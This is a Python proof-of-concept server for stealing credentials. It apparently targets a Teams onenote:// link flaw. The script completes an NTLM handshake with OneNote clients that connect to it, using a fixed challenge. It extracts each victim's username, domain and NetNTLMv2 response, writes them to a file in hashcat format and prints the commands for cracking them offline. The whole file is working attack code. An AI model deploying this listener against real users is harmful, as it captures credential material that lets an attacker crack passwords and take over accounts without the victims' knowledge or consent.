"""
NTLM Hash Capture Server
Teams onenote:// → NTLMv2 Credential Theft POC

Listens for incoming HTTP connections from OneNote and performs
a full NTLM challenge-response handshake to capture the victim's
NTLMv2 hash for offline cracking.

Usage:
    python listener.py [port]
    default port: 8877

Output:
    Prints captured hash in hashcat -m 5600 (NetNTLMv2) format.

Requirements:
    Python 3.6+, no external dependencies.
"""
import sys
import socket
import struct
import base64
import binascii
import datetime
import threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8877

# Fixed 8-byte NTLM server challenge.
# In production use os.urandom(8) for a random challenge each run.
SERVER_CHALLENGE = b"\x01\x02\x03\x04\x05\x06\x07\x08"


def timestamp():
    return datetime.datetime.utcnow().isoformat()


# ── NTLM message builders / parsers ───────────────────────────────────────────

def build_ntlm_type2(challenge):
    """
    Build a minimal but valid NTLM Type 2 (Challenge) message.

    Memory layout (no Version field — 48-byte fixed header):
      0x00  Signature        8 B   "NTLMSSP\\x00"
      0x08  MessageType      4 B   2
      0x0C  TargetNameFields 8 B   len=0 maxlen=0 offset=48
      0x14  NegotiateFlags   4 B   0x00808205
      0x18  ServerChallenge  8 B   <attacker-chosen nonce>
      0x20  Reserved         8 B   0x00 * 8
      0x28  TargetInfoFields 8 B   len=4 maxlen=4 offset=48
    ─────────────────────────────  48 bytes header
      0x30  Payload: MsvAvEOL AvPair  4 B  \\x00\\x00\\x00\\x00
    """
    PAYLOAD_OFFSET = 48
    eol_pair = struct.pack("<HH", 0, 0)          # MsvAvEOL — ends AvPair list

    msg  = b"NTLMSSP\x00"                        # Signature
    msg += struct.pack("<I", 2)                  # MessageType = 2
    msg += struct.pack("<HHI", 0, 0, PAYLOAD_OFFSET)   # TargetNameFields (empty)
    msg += struct.pack("<I", 0x00808205)         # NegotiateFlags
    msg += challenge                             # ServerChallenge
    msg += b"\x00" * 8                          # Reserved
    msg += struct.pack("<HHI",                   # TargetInfoFields
                       len(eol_pair),
                       len(eol_pair),
                       PAYLOAD_OFFSET)
    msg += eol_pair                              # Payload
    return msg


def parse_ntlm_type3(token_b64):
    """
    Parse an NTLM Type 3 (Authenticate) message.
    Returns a dict with username, domain, workstation, and the
    hashcat-ready NetNTLMv2 string, or None on failure.
    """
    try:
        data = base64.b64decode(token_b64)

        if not data.startswith(b"NTLMSSP\x00"):
            return None
        if struct.unpack("<I", data[8:12])[0] != 3:
            return None

        def read_security_buffer(offset):
            length = struct.unpack("<H", data[offset:offset + 2])[0]
            buf_offset = struct.unpack("<I", data[offset + 4:offset + 8])[0]
            return data[buf_offset:buf_offset + length]

        nt_response  = read_security_buffer(20)
        domain       = read_security_buffer(28).decode("utf-16-le", errors="replace")
        username     = read_security_buffer(36).decode("utf-16-le", errors="replace")
        workstation  = read_security_buffer(44).decode("utf-16-le", errors="replace")

        # NTLMv2: first 16 bytes of NT response = NTProofStr (the hash)
        #         remainder = blob (client challenge + timestamp + target info)
        nt_proof_str = nt_response[:16]
        blob         = nt_response[16:]

        challenge_hex = binascii.hexlify(SERVER_CHALLENGE).decode()
        proof_hex     = binascii.hexlify(nt_proof_str).decode()
        blob_hex      = binascii.hexlify(blob).decode()

        # hashcat -m 5600 format: user::domain:ServerChallenge:NTProofStr:blob
        hashcat_line = f"{username}::{domain}:{challenge_hex}:{proof_hex}:{blob_hex}"

        return {
            "username":    username,
            "domain":      domain,
            "workstation": workstation,
            "hashcat":     hashcat_line,
        }

    except Exception as ex:
        return {"error": str(ex)}


# ── Raw HTTP helpers ───────────────────────────────────────────────────────────

def recv_http_request(sock):
    """
    Read one complete HTTP request from an open socket.
    Returns (method, path, headers_dict, body_bytes).
    Returns (None, None, {}, b"") on connection close.
    """
    raw = b""
    while b"\r\n\r\n" not in raw:
        chunk = sock.recv(4096)
        if not chunk:
            return None, None, {}, b""
        raw += chunk

    header_section, _, body_start = raw.partition(b"\r\n\r\n")
    lines = header_section.decode("utf-8", errors="replace").split("\r\n")

    parts  = lines[0].split(" ")
    method = parts[0] if parts else ""
    path   = parts[1] if len(parts) > 1 else "/"

    headers = {}
    for line in lines[1:]:
        if ":" in line:
            key, _, val = line.partition(":")
            headers[key.strip().lower()] = val.strip()

    content_length = int(headers.get("content-length", 0))
    body = body_start
    while len(body) < content_length:
        body += sock.recv(4096)

    return method, path, headers, body


def send_http_response(sock, status_code, reason, extra_headers=None, body=b""):
    """
    Send an HTTP/1.1 response, keeping the connection alive (NTLM requires this).
    """
    if isinstance(body, str):
        body = body.encode()

    lines = [f"HTTP/1.1 {status_code} {reason}"]
    lines.append("Connection: keep-alive")
    lines.append(f"Content-Length: {len(body)}")
    if extra_headers:
        for k, v in extra_headers.items():
            lines.append(f"{k}: {v}")

    response = "\r\n".join(lines) + "\r\n\r\n"
    sock.sendall(response.encode() + body)


# ── Per-connection NTLM handler ───────────────────────────────────────────────

def handle_connection(conn, addr):
    """
    Handle a single TCP connection through the full NTLM handshake.

    NTLM over HTTP is connection-bound — all three messages (Type1, Type2,
    Type3) must travel on the same socket. This loop keeps the socket open
    and processes requests sequentially until the handshake completes or
    the client disconnects.
    """
    print(f"\n[{timestamp()}] Connection from {addr[0]}:{addr[1]}", flush=True)

    try:
        while True:
            method, path, headers, body = recv_http_request(conn)

            if method is None:
                # Client closed the connection
                break

            auth_header = headers.get("authorization", "")
            print(f"  > {method} {path}", flush=True)

            # ── No NTLM token present ─────────────────────────────────────────
            if not auth_header.upper().startswith("NTLM "):
                print(f"  [NTLM] No token — issuing bare challenge", flush=True)
                send_http_response(conn, 401, "Unauthorized",
                                   extra_headers={"WWW-Authenticate": "NTLM"})
                continue

            # ── NTLM token present — determine message type ───────────────────
            token_b64 = auth_header.split(" ", 1)[1].strip()

            try:
                raw_token = base64.b64decode(token_b64)
                msg_type  = struct.unpack("<I", raw_token[8:12])[0]
            except Exception:
                msg_type = 0

            if msg_type == 1:
                # ── Type 1: Negotiate ─────────────────────────────────────────
                # Client announces supported features.
                # Respond with Type 2 Challenge on the SAME connection.
                type2_msg    = build_ntlm_type2(SERVER_CHALLENGE)
                type2_b64    = base64.b64encode(type2_msg).decode()
                challenge_hex = binascii.hexlify(SERVER_CHALLENGE).decode()
                print(f"  [NTLM] Type 1 received — sending Type 2 challenge ({challenge_hex})",
                      flush=True)
                send_http_response(conn, 401, "Unauthorized",
                                   extra_headers={"WWW-Authenticate": f"NTLM {type2_b64}"})
                # Loop continues — Type 3 will arrive on this same socket

            elif msg_type == 3:
                # ── Type 3: Authenticate ──────────────────────────────────────
                # Client responds with credentials derived from the challenge.
                # This contains the NTLMv2 hash we want.
                result = parse_ntlm_type3(token_b64)

                if result and "hashcat" in result:
                    print(f"\n{'!' * 72}")
                    print(f"  [!!!] NTLMv2 HASH CAPTURED from {addr[0]}")
                    print(f"  User        : {result['username']}")
                    print(f"  Domain      : {result['domain']}")
                    print(f"  Workstation : {result['workstation']}")
                    print(f"\n  Crack with  : hashcat -m 5600 hash.txt wordlist.txt")
                    print(f"\n  {result['hashcat']}")
                    print(f"{'!' * 72}", flush=True)

                    # Append hash to file for convenience
                    with open("captured_hashes.txt", "a") as f:
                        f.write(result["hashcat"] + "\n")
                    print(f"  [*] Hash appended to captured_hashes.txt", flush=True)

                else:
                    print(f"  [NTLM] Type 3 parse error: {result}", flush=True)

                # Send 200 so OneNote doesn't retry indefinitely
                send_http_response(conn, 200, "OK", body=b"ok")
                # Keep looping — OneNote may open more parallel connections

            else:
                print(f"  [NTLM] Unknown token type {msg_type} — re-challenging", flush=True)
                send_http_response(conn, 401, "Unauthorized",
                                   extra_headers={"WWW-Authenticate": "NTLM"})

    except Exception as ex:
        print(f"  [!] Connection error: {ex}", flush=True)
    finally:
        conn.close()


# ── Main server ───────────────────────────────────────────────────────────────

def main():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(("0.0.0.0", PORT))
    server_sock.listen(20)

    print(f"[*] NTLM capture listener started")
    print(f"[*] Listening on      : 0.0.0.0:{PORT}")
    print(f"[*] Server challenge  : {binascii.hexlify(SERVER_CHALLENGE).decode()}")
    print(f"[*] Hashes saved to   : captured_hashes.txt")
    print(f"[*] Crack command     : hashcat -m 5600 captured_hashes.txt wordlist.txt")
    print(f"[*] Waiting for connections...", flush=True)

    while True:
        conn, addr = server_sock.accept()
        thread = threading.Thread(target=handle_connection, args=(conn, addr), daemon=True)
        thread.start()


if __name__ == "__main__":
    main()
